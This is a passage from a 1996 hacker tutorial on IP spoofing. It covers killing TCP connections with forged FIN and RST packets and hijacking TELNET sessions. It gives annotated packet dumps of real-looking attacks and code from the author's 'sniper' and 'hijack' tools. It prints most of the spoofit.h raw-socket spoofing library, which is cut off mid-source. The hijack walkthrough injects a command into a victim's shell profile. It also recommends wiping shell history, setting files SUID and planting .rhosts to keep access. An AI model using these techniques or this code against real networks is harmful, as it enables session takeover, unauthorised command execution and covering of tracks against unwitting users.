	- use blocking IO (not necessarilly, because the RST killer would 
                          loose some of it's beauty (looping), this is dealt 
                          with in the FIN killer example. Blocking is a 
                          little faster when a lot of packets come after 
                          each other.)
        - multi-packet firing... fire more packets with incremented SEQ. 
	  (this is commented in the source) 
        - waiting for a pure ACK packet (no data), because otherwise you 
          risk to much of getting mid transmission and not being fast enough.
          (disadvantage is the 'waiting period' before the connection is 
          killed)         

NOTE these examples were done on non-loaded networks, with non-loaded 
     servers, what makes it a worst case scenario for speed problems.

4.3.2 Closing a connection (FIN)
--------------------------------

Concept:
An other flag is FIN and says: "no more data from sender".
This flag is used when closing a connection down the normal legit way. So 
if there was a way to make a packet that is accepted by one of the two 
hosts, this host would believe the 'sender' didn't have any data left.
Following (real) packets would be ignored as they are considered bogus.
That's it, because we can sniff the current SEQ/ACK of the connection we 
can pretend to be either host A or B, and provide the other host with 
CORRECT packetinformation, and an evil FIN flag.
The beauty of it all is, that after a FIN is send the other host always 
replies with one if it is accepted, so we have a way to verify our 
killing, and can be 100% sure of success (if for some reason we missed a 
SEQ or ACK, we can just resend).
RST killing is more popular and is prefered, but I've put this in as an 
example, and I like it myself.


An actual attack:
(These are real sniffed packets, although IP numbers of hosts were changed)
host A : 166.66.66.1
host B : 111.11.11.11
(S on same subnet as A)

1) connection is running....
   sniper is started on host S as 'sniper-fin 166.66.66.1 23 111.11.11.11 1072' 
   and waits for a packet to take action (we need to get SEQ/ACK)
   (mind you switching host A and B would be the same, only S would be 
    impersonating A instead of B)
   suddenly a packet arrives... (A->B)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
   SEQ (hex): 19C6B98B   ACK (hex): 69C5473E
   FLAGS: -AP---   Window: 3400
Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
 45 E 00 . 00 . 2A * 30 0 5E ^ 40 @ 00 . 40 @ 06 . 5E ^ AD . 9D . C1 . 45 E 33 3
 9D . C1 . 2B + 0D . 00 . 17 . 04 . 30 0 19 . C6 . B9 . 8B . 69 i C5 . 47 G 3E >
 50 P 18 . 34 4 00 . 3A : 61 a 00 . 00 . 0D . 0A .
                                         ~~~~~~~~~ > 2 data bytes

2) sniper detected it, and sends a bogus packet. (S as B -> A)
   We calculate our SEQ as: ACK of (A->B) packet
   We calculate our ACK as: SEQ of (A->B) packet + datalength of that packet
                            (19C6B98B + 2 = 19C6B98D)
   (so we tell A, we received the last packet, and will not transmit 
   further data)

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.1072-166.66.66.1.23
   SEQ (hex): 69C5473E   ACK (hex): 19C6B98D
   FLAGS: -A---F   Window: 7C00
   (data removed because irrelevant)

3) host A now says: 'okay, you end the session, so here is my last data'
   (A->B)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
   SEQ (hex): 19C6B98D   ACK (hex): 69C5473E
   FLAGS: -AP---   Window: 3400
   (data removed because irrelevant)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
   SEQ (hex): 19C6B998   ACK (hex): 69C5473F
   FLAGS: -A----   Window: 3400
   (data removed because irrelevant)

4) host A now has flushed its buffer and on his turn FIN's the connection.
   (A->B)
   sniper, intercepts this packet and now knows the hosts fell for the 
   spoof and the killing was a success!
   (host A will no longer accept any data)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
   SEQ (hex): 19C6B998   ACK (hex): 69C5473F
   FLAGS: -A---F   Window: 3400
   (data removed because irrelevant)

5) We impersonated B, making A believe we had no further data. But B 
   doesn't know that and continues to send packets.
   (B->A)
   host A has that connection closed, and thus thinks the real packets of 
   B are spoofed (or at least bogus)! So host A sends some reset packets 
   (RST).

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.1072-166.66.66.1.23
   SEQ (hex): 69C5473E   ACK (hex): 19C6B98D
   FLAGS: -A----   Window: 3750
   (data removed because irrelevant)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
   SEQ (hex): 19C6B98D      FLAGS: ---R--
   (data removed because irrelevant)

6) This goes on for a couple of packets.


Discussion of the program (numbers correspond with those of 'An Actual 
Attack'):

1) stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,ACK,10);
   if(stat==-1)  {printf("Connection 10 secs idle... timeout.\n");exit(1);}
 
   We use wait_packet on a non blocking socket. This way we can enable a 
   10 seconds timeout. This functions returns when the correct packet 
   has been delivered (or timeout).

2) sp_seq=pinfo.ack;
   sp_ack=pinfo.seq+pinfo.datalen;
   transmit_TCP (fd_send, NULL,0,0,0,DEST,DEST_P,SOURCE,SOURCE_P,
						      sp_seq,sp_ack,ACK|FIN);

   We calculate a spoofed SEQ/ACK, and fire off a fake FIN packet. As we 
   don't send any data with it, our buffer is set to NULL and datalength 
   to 0.
   NOTE together with FIN, you need to enable ACK.

3) N/A

4) stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,FIN,5);
   if(stat>=0)
        {printf("Killed the connection...\n");
        exit(0);}

   We wait for a FIN packet (note the FIN in wait_packet). We use a 5 
   sec. timeout, if the function returns and stat>=0 (-1 on timeout), we 
   know our attempt was successfull.

5) N/A

6) N/A

NOTE We can have the same problem here as with the RST killer. But didn't 
     have it here, because the packet we responded upon was the end of a 
     data stream (in fact it was an echo from a shell command)

4.3.3 Improving 
---------------

Except from multipacket firing, it is advised to launch 2 attacks (one in 
both ways). This illiminates one side oriented connections to be handled 
optimally. I think of things like downloading data, which is a one way 
data-flow, it is much easier sending a RST from the (spoofed) receiver to 
the sender, then the other way around.
Those 2 attacks could both impersonate host A and B, and thus giving is 4 
times more chance of a succesfull kill.
I'll leave further experimenting up to you (use your imagination to handle 
different situations).

4.4 Connection Hijacking
------------------------
Setup:
          host A <------X------------------------->host B
                        |      A,B have a TCP connection running (TELNET)
          host S <------/      A,S on same subnet

Concept:
(suppose a TELNET from A (client) to B (server))
TCP separates good and bogus packets by their SEQ/ACK numbers i.e. B 
trusts the packets from A because of its correct SEQ/ACK numbers. 
So if there was a way to mess up A's SEQ/ACK, B would stop believing A's 
real packets.
We could then impersonate to be A, but using correct SEQ/ACK numbers 
(that is numbers correct for B).
We would now have taken over the connection (host A is confused, B thinks 
nothings wrong (almost correct, see 'actual attack'), and S sends 
'correct' data to B). 
This is called 'Hijacking' a connection. (generally hijacking a TELNET session,
but same could be done woth FTP, RLOGIN, etc...)
How could we mess up A's SEQ/ACK numbers? Well by simply inserting a data 
packet into the stream at the right time (S as A->B), the server B would 
accept this data, and update ACK numbers, A would continue to send 
it's old SEQ numbers, as it's unaware of our spoofed data. 

Use: 
I allready hear you wiseguys yelling: "Hey dude, why hijack a connection 
if you can sniff those packets anyway??"
Well, anybody heared of One Time Passwords, Secure Key?? Case closed.... 
(S/Key: server challenges client, client and server calculate a code from 
the challenge and password, and compare that code. The password itself is 
never send on the cable, so you can't sniff sh!t).
(OTP: server has a list of passwords, once one is used, it is destroyed, 
so sniffing gets you a password that has 'just' expired ;)
(ALL types of identification that happen at connection (encrypted or not, 
trusted or not), and don't use encrypted data transfer, are vulnerable to 
'hijacking'.)

An actual attack:
(These are real sniffed packets, although IP numbers of hosts were changed)
(suppose a TELNET from A (client) to B (server))
host A : 166.66.66.1
host B : 111.11.11.11
(S on same subnet as A)

1) connection running... 
   we look with sniffit, and see he's busy in a shell, we start 'hijack' 
   on host S as 'hijack 166.66.66.1 2035 111.11.11.11'
   a packet containing from (A->B) is detected... hijack takes action...
   (A->B)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
   SEQ (hex): 5C8223EA   ACK (hex): C34A67F6
   FLAGS: -AP---   Window: 7C00
Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
 45 E 00 . 00 . 29 ) CA . F3 . 40 @ 00 . 40 @ 06 . C5 . 0E . 9D . C1 . 45 E 3F ?
 9D . C1 . 2A * 0B . 04 . 10 . 00 . 17 . 5C \ 82 . 23 # EA . C3 . 4A J 67 g F6 .
 50 P 18 . 7C | 00 . 6D m 29 ) 00 . 00 . 6C l
                                         ~~~~

2) host B (server) echo's that databyte (typing 'l' in a bash shell!!!)
   (you gotta know what you are doing)
   (B->A)   

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
   SEQ (hex): C34A67F6   ACK (hex): 5C8223EB
   FLAGS: -AP---   Window: 2238
Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
 45 E 00 . 00 . 29 ) B5 . BD . 40 @ 00 . FC . 06 . 1E . 44 D 9D . C1 . 2A * 0B .
 9D . C1 . 45 E 3F ? 00 . 17 . 04 . 10 . C3 . 4A J 67 g F6 . 5C \ 82 . 23 # EB .
 50 P 18 . 22 " 38 8 C6 . F0 . 00 . 00 . 6C l
                                         ~~~~

3) A simple ACK from host A to B responding to that echo. Because we know 
   this can come, and we know a simple ACK doesn't contain data, we don't 
   need this for SEQ/ACK calculation.

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
   SEQ (hex): 5C8223EB   ACK (hex): C34A67F7
   FLAGS: -A----   Window: 7C00
   (data removed because irrelevant)

4) Now we impersonate further data (following packet 1). (S as A -> B)
   We calculate SEQ/ACK out of packet 1, NOT out of the 'echo' from B, 
   because we have to be as fast as possible, and packet 2 could be slow.
   We send some backspaces and some enters. To clean up the command line.
   We will probably still get some error message back from the shell.
   But we handle that too! (see sourcecode)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
   SEQ (hex): 5C8223EB   ACK (hex): C34A67F6
   FLAGS: -AP---   Window: 7C00
Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
 45 E 00 . 00 . 32 2 31 1 01 . 00 . 00 . 45 E 06 . 99 . F8 . 9D . C1 . 45 E 3F ?
 9D . C1 . 2A * 0B . 04 . 10 . 00 . 17 . 5C \ 82 . 23 # EB . C3 . 4A J 67 g F6 .
 50 P 18 . 7C | 00 . AE . F5 . 00 . 00 . 08 . 08 . 08 . 08 . 08 . 08 . 08 . 08 .
 0A . 0A .

5) This is the echo of our spoofed data. Look at ACK. (B->A)
   5C8223F5 = 5C8223EB + 0A (this is how we detect that the spoof was a 
   success)   
   NOTE that at this point the connection is ours, and A's SEQ/ACK 
        numbers are completely f#cked up according to B.   

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
   SEQ (hex): C34A67F7   ACK (hex): 5C8223F5
   FLAGS: -AP---   Window: 2238
Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
 45 E 00 . 00 . 3C < B5 . BE . 40 @ 00 . FC . 06 . 1E . 30 0 9D . C1 . 2A * 0B .
 9D . C1 . 45 E 3F ? 00 . 17 . 04 . 10 . C3 . 4A J 67 g F7 . 5C \ 82 . 23 # F5 .
 50 P 18 . 22 " 38 8 26 & 7C | 00 . 00 . 5E ^ 48 H 5E ^ 48 H 5E ^ 48 H 5E ^ 48 H
 5E ^ 48 H 5E ^ 48 H 5E ^ 48 H 5E ^ 48 H 0D . 0A . 0D . 0A .

6) Hijack will now try to get on track of SEQ/ACK numbers again, to send 
   the data we want to be executed.
   NOTE each time a packet 'out of numbering' arrives the host should 
        answer with correct SEQ/ACK, this provides us with the certainty 
        that a lot of packets are going to be send with correct (and not 
        changing) SEQ/ACK nrs. (this is where the mechanism of getting our 
        numbers back straight is based upon) 
   NOTE it's at this point the real TELNET client's session hangs, most 
        people ignore this and re-login after a few secs, accepting the 
        accident as Murphy's law.
        (Well it *can* happen without any spoofing involved)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
   SEQ (hex): 5C8223EB   ACK (hex): C34A67F7
   FLAGS: -AP---   Window: 7C00
   (data removed because irrelevant)


TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
   SEQ (hex): C34A680B   ACK (hex): 5C8223F5
   FLAGS: -A----   Window: 2238
   (data removed because irrelevant)


TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-157.193.42.11.23
   SEQ (hex): 5C8223EB   ACK (hex): C34A67F7
   FLAGS: -AP---   Window: 7C00
   (data removed because irrelevant)


TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
   SEQ (hex): C34A680B   ACK (hex): 5C8223F5
   FLAGS: -A----   Window: 2238
   (data removed because irrelevant)

7) We are back on track (or at least hijack is, because this is going 
   very fast). And we fire off our faked bash command.

    echo "echo HACKED" >> $HOME/.profile<ENTER>

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1040-111.11.11.11.23
   SEQ (hex): 5C8223F5   ACK (hex): C34A680B
   FLAGS: -AP---   Window: 7C00
Packet ID (from_IP.port-to_IP.port): 166.66.66.1-111.11.11.11.23
 45 E 00 . 00 . 4D M 31 1 01 . 00 . 00 . 45 E 06 . 99 . DD . 9D . C1 . 45 E 3F ?
 9D . C1 . 2A * 0B . 04 . 10 . 00 . 17 . 5C \ 82 . 23 # F5 . C3 . 4A J 68 h 0B .
 50 P 18 . 7C | 00 . 5A Z B6 . 00 . 00 . 65 e 63 c 68 h 6F o 20   22 " 65 e 63 c
 68 h 6F o 20   48 H 41 A 43 C 4B K 45 E 44 D 22 " 20   3E > 3E > 24 $ 48 H 4F O
 4D M 45 E 2F / 2E . 70 p 72 r 6F o 66 f 69 i 6C l 65 e 0A . 00 .

8) now we wait for this data to be confirmed.
   ACK = 5C8223F5 + 025 (=37 bytes)

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1040
   SEQ (hex): C34A680B   ACK (hex): 5C82241A
   FLAGS: -AP---   Window: 2238
Packet ID (from_IP.port-to_IP.port): 157.193.42.11.23-157.193.69.63.1040
   (data removed because irrelevant)

9) The connection runs on. Now you can execute more commands (just stay 
   on track of SEQ/ACK), and even finnish the connection (with the same  
   mechanism of sniper, or with sniper itself... here FIN is recommended).
   NOTE: here it is important to be in a shell. But if you have been 
         watching someone, and you notice he's always directly going to 
         'pine' and you can't get inbetween on time.
         NO PROBS.... just make a cleanup string that cleans up 
         'pine' and puts you back in the shell. (some control chars, 
         hotkeys, whatever....)
   NOTE: if you clean up the .sh_history of .bash_history (whatever) this 
         attack is one of the nicest there is. Another advantage above 
         sniffing.
   NOTE: Noone says you have to make a .rhosts file (rlogin and 
         family might be disabled), you can change permissions, put 
         stuff SUID, put it public, install stuff, mail, etc.. 

Discussion of the program (numbers correspond with those of 'An Actual 
Attack'):

1) wait_packet(fd_receive,&attack_info,CLIENT, CLIENT_P, SERVER, 23,ACK|PSH,0);

   Waiting for actual data (PSH is always used for packets containing 
   data in interactive services like TELNET)

2) N/A

3) N/A

4) sp_seq=attack_info.seq+attack_info.datalen;
   sp_ack=attack_info.ack;
   transmit_TCP(fd_send, to_data,0,0,sizeof(to_data),CLIENT, CLIENT_P, SERVER,
                                                     23,sp_seq,sp_ack,ACK|PSH);

   We recalculate the sequence number (using SEQ and datalength of packet 1)
   an we send a spoofed packet with ACK and PSH flag, containing the 
   cleanup data in to_data.

5) while(count<5)
        {
        wait_packet(fd_receive, &attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
        if(attack_info.ack==sp_seq+sizeof(to_data))
                count=PERSONAL_TOUCH;
        else count++;
        };

   We wait for a confirmation that our spoofed sequence is accepted. We 
   expect a packet with an ACK set (PSH or not). It should come within 5  
   packets, we use this limit, because we should be able to handle some 
   previous ACK packets!
   NOTE we don't check SEQ nrs, because we have no clue of what they are 
        going to be (data might have been send our way, or not).

6) while(count<10)
        {
        old_seq=serv_seq;
        old_ack=serv_ack;
        wait_packet(fd_receive,&attack_info,SERVER, 23, CLIENT, CLIENT_P, 
                                                                     ACK,0);
	if(attack_info.datalen==0)
          {
          serv_seq=attack_info.seq+attack_info.datalen;
          serv_ack=attack_info.ack;
          if( (old_seq==serv_seq)&&(serv_ack==old_ack) )
                count=PERSONAL_TOUCH;
          else count++;
          }
        };

   To get back on track, we try to receive 2 ACK packets without data 
   with the same SEQ/ACK. We know enough packets will be send as a 
   response to incorrect packets from the confused host A.
   This is how we get back on track. 
   NOTE In a case where A completely gave up, simple spoof a packet with 
        incorrect SEQ/ACK to get the correct numbers back.

7) transmit_TCP(fd_send, evil_data,0,0,sizeof(evil_data),CLIENT,CLIENT_P,
                                      SERVER,23,serv_ack,serv_seq,ACK|PSH);

   Pretty clear....

8) while(count<5)
        {
        wait_packet(fd_receive,&attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
        if(attack_info.ack==serv_ack+sizeof(evil_data))
                count=PERSONAL_TOUCH;
        else count++;
        };

   and again waiting for confirmation.

   NOTE after the above attack, hijack had produced the following output:

   Starting Hijacking demo - Brecht Claerhout 1996
   -----------------------------------------------

   Takeover phase 1: Stealing connection.
     Sending Spoofed clean-up data...
     Waiting for spoof to be confirmed...
   Phase 1 ended.

   Takeover phase 2: Getting on track with SEQ/ACK's again
     Server SEQ: C34A680B (hex)    ACK: 5C8223F5 (hex)
   Phase 2 ended.

   Takeover phase 3: Sending MY data.
     Sending evil data.
     Waiting for evil data to be confirmed...
   Phase 3 ended.                                 
 
4.5 Other
---------

This list is far from complete, I'm sure you can think of other nice things 
to do with this information, think, experiment and code!


5. The source code
------------------

---=[ spoofit.h ]=------------------------------------------------------------
/**************************************************************************/
/* Spoofit.h - Include file for easy creating of spoofed TCP packets      */
/*             Requires LINUX 1.3.x (or later) Kernel                     */
/*             (illustration for 'A short overview of IP spoofing')       */
/*             V.1 - Copyright 1996 - Brecht Claerhout                    */
/*                                                                        */
/*  Purpose - Providing skilled people with a easy to use spoofing source */
/*            I used it to be able to write my tools fast and short.      */
/*            Mind you this is only illustrative and can be easily        */
/*            optimised.                                                  */ 
/*                                                                        */
/*  Author - Dr_Sp00f (Himself)                   */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This file is for educational purposes only. I am in      */
/*               NO way responsible for what you do with this file,       */
/*               or any damage you or this file causes.                   */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               If you know a little about your OS, shouldn't be to hard */
/*               to port.                                                 */
/*                                                                        */ 
/* Important note - You might have noticed I use non standard packet      */
/*                  header struct's. How come?? Because I started like    */
/*                  that on Sniffit because I wanted to do the            */
/*                  bittransforms myself.                                 */
/*                  Well I got so damned used to them, I keep using them, */
/*                  they are not very different, and not hard to use, so  */
/*                  you'll easily use my struct's without any problem,    */
/*                  this code and the examples show how to use them.      */ 
/*                  my apologies for this inconvenience.                  */
/*                                                                        */
/* None of this code can be used in commercial software. You are free to  */
/* use it in any other non-commercial software (modified or not) as long  */
/* as you give me the credits for it. You can spread this include file,   */
/* but keep it unmodified.                                                */
/*                                                                        */
/**************************************************************************/
/*                                                                        */
/* Easiest way to understand this library is to look at the use of it, in */
/* the example progs.                                                     */
/*                                                                        */
/**** Sending packets *****************************************************/
/*                                                                        */ 
/* int open_sending (void)                                                */ 
/*   Returns a filedescriptor to the sending socket.                      */
/*   close it with close (int filedesc)                                   */
/*                                                                        */ 
/* void transmit_TCP (int sp_fd, char *sp_data,                           */
/*	              int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen,  */
/*                    char *sp_source, unsigned short sp_source_port,     */ 
/*                    char *sp_dest,unsigned short sp_dest_port,          */ 
/*                    unsigned long sp_seq, unsigned long sp_ack,         */ 
/*                    unsigned short sp_flags)                            */ 
/*   fire data away in a TCP packet                                       */
/*    sp_fd         : raw socket filedesc.                                */ 
/*    sp_data       : IP options (you should do the padding)              */
/*                    TCP options (you should do the padding)             */
/*                    data to be transmitted                              */
/*                    (NULL is nothing)                                   */
/*                    note that all is optional, and IP en TCP options are*/
/*                    not often used.                                     */
/*                    All data is put after eachother in one buffer.      */
/*    sp_ipoptlen   : length of IP options (in bytes)                     */
/*    sp_tcpoptlen  : length of TCP options (in bytes)                    */
/*    sp_datalen    : amount of data to be transmitted (bytes)            */
/*    sp_source     : spoofed host that"sends packet"                     */
/*    sp_source_port: spoofed port that "sends packet"                    */
/*    sp_dest       : host that should receive packet                     */
/*    sp_dest_port  : port that should receive packet                     */
/*    sp_seq        : sequence number of packet                           */
/*    sp_ack        : ACK of packet                                       */
/*    sp_flags      : flags of packet (URG,ACK,PSH,RST,SYN,FIN)           */
/*                                                                        */
/* void transmit_UDP (int sp_fd, char *sp_data,                           */
/*                    int sp_ipoptlen, int sp_datalen,                    */
/*		      char *sp_source, unsigned short sp_source_port,     */
/*                    char *sp_dest, unsigned short sp_dest_port)         */
/*   fire data away in an UDP packet                                      */
/*    sp_fd         : raw socket filedesc.                                */ 
/*    sp_data       : IP options                                          */
/*                    data to be transmitted                              */
/*                    (NULL if none)                                      */
/*    sp_ipoptlen   : length of IP options (in bytes)                     */
/*    sp_datalen    : amount of data to be transmitted                    */ 
/*    sp_source     : spoofed host that"sends packet"                     */
/*    sp_source_port: spoofed port that "sends packet"                    */
/*    sp_dest       : host that should receive packet                     */
/*    sp_dest_port  : port that should receive packet                     */
/*                                                                        */
/**** Receiving packets ***************************************************/
/*                                                                        */
/* int open_receiving (char *rc_device, char mode)                        */
/*   Returns fdesc to a receiving socket                                  */
/*        (if mode: IO_HANDLE don't call this twice, global var           */
/*         rc_fd_abc123 is  initialised)                                  */
/*     rc_device: the device to use e.g. "eth0", "ppp0"                   */
/*                be sure to change DEV_PREFIX accordingly!               */
/*                DEV_PREFIX is the length in bytes of the header that    */
/*                comes with a SOCKET_PACKET due to the network device    */
/*     mode: 0: normal mode, blocking, (read will wait till packet        */ 
/*           comes, mind you, we are in PROMISC mode)                     */
/*           IO_NONBLOCK: non-blocking mode (read will not wait till      */
/*           usefull for active polling)                                  */
/*           IO_HANDLE installs the signal handler that updates SEQ,ACK,..*/
/*           (IO_HANDLE is not recommended to use, as it should be        */
/*           modified according to own use, and it works bad on heavy     */
/*           traffic continuous monitoring. I needed it once, but left it */
/*           in to make you able to have a look at Signal handled IO,     */
/*           personally I would have removed it, but some thought it      */
/*           doesn't do any harm anyway, so why remove... )               */ 
/*           (I'm not giving any more info on IO_HANDLE as it is not      */
/*           needed for the example programs, and interested people can   */
/*           easilythey figure the code out theirselves.)                 */
/*           (Besides IO_HANDLE can only be called ONCE in a program,     */
/*           other modes multiple times)                                  */ 
/*                                                                        */
/* int get_packet (int rc_fd, char *buffer, int *TCP_UDP_start,           */
/*         	   unsigned char *proto)                                  */
/*        This waits for a packet (mode default) and puts it in buffer or */
/*        returns whether there is a pack or not (IO_NONBLOCK).           */
/*        It returns the packet length if there is one available, else 0  */
/*                                                                        */
/* int wait_packet(int wp_fd,struct sp_wait_packet *ret_values,           */
/*                  char *wp_source, unsigned short wp_source_port,       */
/*                  char *wp_dest, unsigned short wp_dest_port,           */
/*	            int wp_flags, int wait_time);                         */
/*   wp_fd: a receiving socket (default or IO_NONBLOCK)                   */
/*   ret_values: pointer to a sp_wait_packet struct, that contains SEQ,   */
/*               ACK, flags, datalen of that packet. For further packet   */
/*               handling see the examples.                               */
/*                  struct sp_wait_packet  {                              */
/*                   	unsigned long seq,ack;                            */
/*                      unsigned short flags;                             */
/*                      int datalen;                                      */
/*                      };                                                */
/*   wp_source, wp_source_port : sender of packet                         */
/*   wp_dest, wp_dest_port     : receiver of packet                       */
/*   wp_flags: flags that should be present in packet.. (mind you there   */
/*             could be more present, so check on return)                 */
/*             note: if you don't care about flag, use 0                  */
/*   wait_time: if not zero, this function will return -1 if no correct   */
/*              packet has arrived within wait_time secs.                 */
/*              (only works on IO_NONBLOCK socket)                        */
/*                                                                        */
/* void set_filter (char *f_source, unsigned short f_source_port,         */
/*                  char *f_dest, unsigned short f_dest_port)             */
/*        (for use with IO_HANDLE)                                        */
/*        Start the program to watch all trafic from source/port to       */
/*        dest/port. This enables the updating of global data. Can        */ 
/*        be called multiple times.                                       */
/*                                                                        */
/* void close_receiving (void)                                            */
/*           When opened a IO_HANDLE mode receiving socket close it with  */
/*           this.                                                        */
/*                                                                        */
/**** Global DATA (IO_HANDLE mode) ****************************************/
/*                                                                        */
/* When accessing global data, copy the values to local vars and then use */
/* them. Reduce access time to a minimum.                                 */
/* Mind you use of this is very limited, if you are a novice on IO, just  */
/* ignore it, the other functions are good enough!). If not, rewrite the  */
/* handler for your own use...                                            */
/*                                                                        */
/* sig_atomic_t SP_DATA_BUSY                                              */
/*        Put this on NON-ZERO when accesing global data. Incoming        */
/*        packets will be ignored then, data can not be overwritten.      */
/*                                                                        */
/* unsigned long int CUR_SEQ, CUR_ACK;                                    */
/*        Last recorded SEQ and ACK number of the filtered "stream".      */
/*        Before accessing this data set SP_DATA_BUSY non-zero,           */
/*        afterward set it back to zero.                                  */
/*                                                                        */
/* unsigned long int CUR_COUNT;                                           */
/*        increased everytime other data is updated                       */
/*                                                                        */
/* unsigned int CUR_DATALEN;                                              */
/*	  Length of date in last TCP packet			          */
/*                                                                        */
/**************************************************************************/

#include "sys/socket.h"       /* includes, what would we do without them  */
#include "netdb.h"
#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "errno.h"
#include "netinet/in.h"
#include "netinet/ip.h"
#include "linux/if.h"
#include "sys/ioctl.h"
#include "sys/types.h"
#include "signal.h"
#include "fcntl.h"

#undef  DEBUG 
#define IP_VERSION 	4                 /* keep y'r hands off...         */
#define MTU 		1500 
#define IP_HEAD_BASE 	20                /* using fixed lengths to send   */ 
#define TCP_HEAD_BASE 	20                /* no options etc...             */ 
#define UDP_HEAD_BASE 	8                 /* Always fixed                  */ 

#define IO_HANDLE	1
#define IO_NONBLOCK	2

int DEV_PREFIX = 9999;		
sig_atomic_t WAIT_PACKET_WAIT_TIME=0;

/**** IO_HANDLE ************************************************************/
int rc_fd_abc123;
sig_atomic_t RC_FILTSET=0;
char rc_filter_string[50];                       /* x.x.x.x.p-y.y.y.y.g  */

sig_atomic_t SP_DATA_BUSY=0;
unsigned long int CUR_SEQ=0, CUR_ACK=0, CUR_COUNT=0;
unsigned int CUR_DATALEN;
unsigned short CUR_FLAGS;
/***************************************************************************/

struct sp_wait_packet
{
	unsigned long seq,ack;
	unsigned short flags;
	int datalen;
};
            
/* Code from Sniffit - BTW my own program.... no copyright violation here */ 
#define URG 32       /* TCP flags */
#define ACK 16 
#define PSH 8 
#define RST 4
#define SYN 2 
#define FIN 1 

struct PACKET_info
{
	int len, datalen;	
	unsigned long int seq_nr, ACK_nr;
	u_char FLAGS;
};

struct IP_header                        /* The IPheader (without options) */
{ 
        unsigned char verlen, type;
        unsigned short length, ID, flag_offset;
        unsigned char TTL, protocol;
        unsigned short checksum;
        unsigned long int source, destination;
};

struct TCP_header                     /* The TCP header (without options) */
{
        unsigned short source, destination;
        unsigned long int seq_nr, ACK_nr;
        unsigned short offset_flag, window, checksum, urgent;
};

struct UDP_header                                      /* The UDP header */
{
        unsigned short source, destination;
        unsigned short length, checksum;
};
           
struct pseudo_IP_header          /* The pseudo IP header (checksum calc) */ 
{
        unsigned long int source, destination;
	char zero_byte, protocol;
	unsigned short TCP_UDP_len;
};

/* data structure for argument passing  */

struct sp_data_exchange	{
	int fd;                                /* Sh!t from transmit_TCP  */
	char *data; 
	int datalen;
	char *source; unsigned short source_port;
	char *dest;   unsigned short dest_port;
        unsigned long seq, ack; 
        unsigned short flags;

	char *buffer;               /* work buffer */

        int IP_optlen;		   /* IP options length in bytes  */
        int TCP_optlen;		   /* TCP options length in bytes */
	};

/**************** all functions  *******************************************/
void transmit_TCP (int fd, char *sp_data, 
		     	   int sp_ipoptlen, int sp_tcpoptlen, int sp_datalen,
		           char *sp_source, unsigned short sp_source_port,
			   char *sp_dest, unsigned short sp_dest_port,
                           unsigned long sp_seq, unsigned long sp_ack, 
                           unsigned short sp_flags);

void transmit_UDP (int sp_fd, char *sp_data, 
			   int  ipoptlen, int sp_datalen, 
		           char *sp_source, unsigned short sp_source_port,
			   char *sp_dest, unsigned short sp_dest_port);

int get_packet (int rc_fd, char *buffer, int *, unsigned char*);
int wait_packet(int,struct sp_wait_packet *,char *, unsigned short,char *, unsigned short, int, int);

static unsigned long sp_getaddrbyname(char *);

int open_sending (void);
int open_receiving (char *, char);
void close_receiving (void);

void sp_send_packet (struct sp_data_exchange *, unsigned char);
void sp_fix_TCP_packet (struct sp_data_exchange *);
void sp_fix_UDP_packet (struct sp_data_exchange *);
void sp_fix_IP_packet (struct sp_data_exchange *, unsigned char);
unsigned short in_cksum(unsigned short *, int );

void rc_sigio (int);
void set_filter (char *, unsigned short, char *, unsigned short);

/********************* let the games commence ****************************/

static unsigned long sp_getaddrbyname(char *sp_name)
{
struct hostent *sp_he;
int i;

if(isdigit(*sp_name))
  return inet_addr(sp_name);

for(i=0;i<100;i++)
     {
     if(!(sp_he = gethostbyname(sp_name)))
	{printf("WARNING: gethostbyname failure!\n");
	sleep(1);
	if(i>=3)       /* always a retry here in this kind of application */
	   printf("Coudn't resolv hostname."), exit(1);
	}
     else break;
     }
return sp_he ? *(long*)*sp_he->h_addr_list : 0;
}

int open_sending (void)
{
struct protoent *sp_proto;   
int sp_fd;
int dummy=1;

/* they don't come rawer */
if ((sp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))==-1) 
        perror("Couldn't open Socket."), exit(1);

#ifdef DEBUG
